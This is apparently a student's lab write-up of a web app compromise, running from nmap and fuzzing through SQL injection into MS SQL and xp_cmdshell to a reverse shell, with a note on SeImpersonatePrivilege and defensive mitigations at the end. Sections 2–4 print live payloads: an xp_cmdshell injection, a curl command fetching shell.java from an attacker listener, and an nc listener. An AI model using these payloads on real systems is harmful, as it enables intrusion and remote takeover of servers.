# Technical Case Study: SQL Injection to Remote Code Execution (RCE)

## 📝 Case Overview Web Application Exploitation
* **By:** Mohammed Ali Abdul Mohsen
* **Team:** Cyber Scope
## Overview
This case study provides a technical deep-dive into the exploitation of an SQL Injection (SQLi) vulnerability within a Windows-based web application. We will analyze the attack vector, the escalation path using `xp_cmdshell`, and the subsequent payload delivery that granted system-level access.

---

## 1. Vulnerability Discovery (Phase 1)
The engagement began with mapping the attack surface. 
### Scanning
I used the nmap to identify the open ports and service 
<img width="853" height="573" alt="Screenshot 2026-06-12 051709" src="https://github.com/user-attachments/assets/10cb79d7-1ccf-4dd9-8eda-d3c7710333b4" />
So the WEB site contain the Pages the NEXT step Is search for Directory 

### Technical Concept: Fuzzing
Fuzzing is the process of sending malformed inputs to an application to identify vulnerabilities. In this case, injecting special characters (`'`, `"`, `;`) into parameters triggered database errors, which provided the necessary feedback to confirm an injection point.

<img width="688" height="416" alt="Screenshot 2026-06-12 001422" src="https://github.com/user-attachments/assets/70b7814a-fa12-4ce5-a889-10b388fe7121" />

### No results But the Directory Menu its add parmeter when i used burpsuite the request its important results 
The win.ini file is a legacy configuration file used in early versions of the Microsoft Windows operating system (specifically 16-bit Windows). It stores system-wide initialization settings and preferences, such as fonts, printer drivers, and application-specific configurations. While most of these settings have been migrated to the Windows Registry in modern Windows versions (Windows NT, 2000, XP, and later), the file is still maintained by the system for backward compatibility with legacy 16-bit applications. It acts as a primary initialization file that Windows reads during the boot process to load environmental variables and user-defined preferences.

<img width="1538" height="850" alt="Screenshot 2026-06-12 052724" src="https://github.com/user-attachments/assets/98c8a304-bd26-4b15-be93-ff3d106f5e67" />

#### I used Wfuzz TO find files important like applications.yml or applications.proprties 

<img width="1544" height="456" alt="Screenshot 2026-06-12 053654" src="https://github.com/user-attachments/assets/28be28d4-1b93-40ea-b7d9-d410fc1c12c8" />

### I got the API Credintinals 

<img width="1728" height="922" alt="Screenshot 2026-06-12 001347" src="https://github.com/user-attachments/assets/e48a355b-e621-4c3d-9f9f-a52ff842ccc9" />
 
## Step tow 
its many Users and you can delete So i try delete Users i used the BurpSuite to show the full request 
so after send delete was sucess but i tried to send SQL to show the response from server 

<img width="1726" height="886" alt="Screenshot 2026-06-12 003356" src="https://github.com/user-attachments/assets/24e6d0aa-5cdf-44b8-9c34-23d24b5d1324" />

f you see a 500 (Internal Server Error): This is "good news" for the attacker (or security researcher)! It means you successfully bypassed the firewall, and the request reached the database, but it caused a "crash" or a programming error. This confirms the existence of a vulnerability.

---

## 2. Exploitation: Database Interaction (Phase 2)
Once the injection point was validated, we interacted with the MS SQL Server backend. 

USE ``` select+*+drom+sysuser ```

<img width="1728" height="892" alt="Screenshot 2026-06-12 003455" src="https://github.com/user-attachments/assets/4846d1c1-60fa-4eda-aa9e-81553ccf8750" />

``` HTTP/1.1 302 ``` its work so lets to use blind SQL

<img width="1728" height="918" alt="Screenshot 2026-06-12 004015" src="https://github.com/user-attachments/assets/7dcdc162-e949-4754-b5b8-7b2c5891b1de" />

When I refresh the website its insert it >> 

<img width="1125" height="113" alt="Screenshot 2026-06-12 060645" src="https://github.com/user-attachments/assets/5b129ef9-b2d9-47fb-ad37-ed48da7de5a3" />

### Privilege Escalation via `xp_cmdshell`
The MS SQL Server contains an extended stored procedure called `xp_cmdshell`. If enabled, it allows the database process to execute commands on the underlying operating system.

**Payload used for validation:**
```sql
-- Validating if we can execute commands
4; EXEC xp_cmdshell 'whoami'
```

## 3. Remote Code Execution (Phase 3)
With the ability to run OS commands, we established a persistence mechanism and a reverse shell.
Methodology : 
   1- Hosting the Payload: A web server was set up on the attacker's machine: python3 -m http.server 8000.
   2- Delivery: The target machine was instructed to fetch the malicious file via curl.
   3- Execution: The target executed the downloaded binary, creating a reverse connection to our listener.

   ```sql 
   EXEC+xp_cmdshell+'curl+http://[LISTENER_IP]:8000/shell.java+--output+%25temp%25/shell.java'
   ```
## 4. Post-Exploitation (Phase 4)

We established a persistent listener on our machine to receive the incoming shell.

Listener Command:
```bash 
nc -lnvp 4444
```
Resulting System Access:

<img width="717" height="285" alt="Screenshot 2026-06-12 061549" src="https://github.com/user-attachments/assets/1200a3f5-b671-4c40-bc30-0592d67648a6" />

## Privilege Escalation Vulnerability
### Understanding SeImpersonatePrivilege
What is it?

SeImpersonatePrivilege is a Windows user right that allows a process or service to "impersonate" (act on behalf of) another user or client after authentication.
Why is it a major security risk?

If a low-privileged service account (like a web server or database service) holds this privilege, attackers can leverage it to achieve complete system compromise via Privilege Escalation:

    The Attack Vector: An attacker tricks a high-privileged service or the Windows OS itself (often running as NT AUTHORITY\SYSTEM) into authenticating against a malicious local server created by the attacker.

    Token Theft: Using SeImpersonatePrivilege, the attacker's malicious service captures the authenticated high-privilege token.

    System Access: The attacker uses this stolen token to spawn a new process, instantly elevating their access to NT AUTHORITY\SYSTEM. Common exploit tools for this include PrintSpoofer and GodPotato.      
## 5. Defensive Recommendations (Mitigation)

Securing an environment against this attack chain requires a "Defense-in-Depth" approach:

  Parameterized Queries (Prepared Statements): Never concatenate user input directly into SQL queries. This is the #1 defense against SQLi.

  Principle of Least Privilege: The SQL Server service account should run as a low-privileged user, not as LocalSystem or Administrator.

   Disable Dangerous Features: Stored procedures like xp_cmdshell should be disabled by default.

  Egress Filtering: Block the database server from making outbound connections to the internet. This prevents attackers from "downloading" payloads.


## 👤 Connect with Me / About Me

I am a **Cyber Security Engineering student** and an active member of the **Cyber Scope** team. My core expertise and passion lie at the intersection of offensive and defensive security, specifically focusing on **Penetration Testing** and **Digital Forensics (DF)**. 

By understanding both adversary attack methodologies and rigorous forensic investigation techniques, I aim to bridge the gap between exploitation and artifact analysis. I constantly challenge myself through hands-on labs, CTFs, and real-world scenarios.

* **Instagram:** [@bingoh0wfun](https://www.instagram.com/e6ecx)
* **Team:** Cyber Scope 🛡️

Feel free to reach out for collaborations, CTF team-ups, or discussions regarding cybersecurity, pentesting, and forensics!

